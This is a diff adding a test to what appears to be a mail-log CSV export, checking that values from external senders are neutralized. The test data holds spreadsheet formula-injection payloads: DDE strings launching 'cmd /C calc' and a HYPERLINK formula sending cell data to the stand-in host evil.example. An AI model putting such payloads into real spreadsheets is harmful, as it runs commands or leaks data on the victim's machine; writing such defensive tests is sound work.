@@ -74,3 +74,54 @@ test.serial(
     t.is(result, 'ENOENT');
   }
 );
+
+test.serial(
+  'neutralizes spreadsheet formulas in values from external senders',
+  async (t) => {
+    const at = new Date(now.getTime() - 10 * 60_000);
+    const _id = new mongoose.Types.ObjectId();
+    await Logs.collection.insertOne({
+      _id,
+      id: _id.toString(),
+      message: 'bounced',
+      bounce_category: 'other',
+      err: {
+        response: '@SUM(1+1)*cmd|" /C calc"!A0',
+        responseCode: 550
+      },
+      meta: {
+        session: {
+          id: 'session-formula',
+          headers: {
+            Subject: '=HYPERLINK("https://evil.example/?"&A1,"Click")',
+            'Message-ID': '+1+cmd|"/C calc"!A0',
+            To: '-2+3'
+          },
+          envelope: {
+            mailFrom: { address: 'sender@example.com' },
+            rcptTo: [{ address: 'to@example.com' }]
+          }
+        }
+      },
+      created_at: at,
+      updated_at: at
+    });
+
+    const { count, gzip } = await getLogsCsv(
+      now,
+      { created_at: { $gte: new Date(at.getTime() - 1000), $lte: at } },
+      true
+    );
+    t.is(count, 1);
+    const [, row] = zlib.gunzipSync(gzip).toString().trim().split('\n');
+    const cells = row.slice(1, -1).split('","');
+    // SMTP Response, To, Subject and Message-ID columns
+    t.is(cells[7], `'@SUM(1+1)*cmd|"" /C calc""!A0`);
+    t.is(cells[11], `'-2+3`);
+    t.is(cells[12], `'=HYPERLINK(""https://evil.example/?""&A1,""Click"")`);
+    t.is(cells[13], `'+1+cmd|""/C calc""!A0`);
+    // ordinary values are left alone
+    t.is(cells[14], 'sender@example.com');
+    t.is(cells[8], '550');
+  }
+);
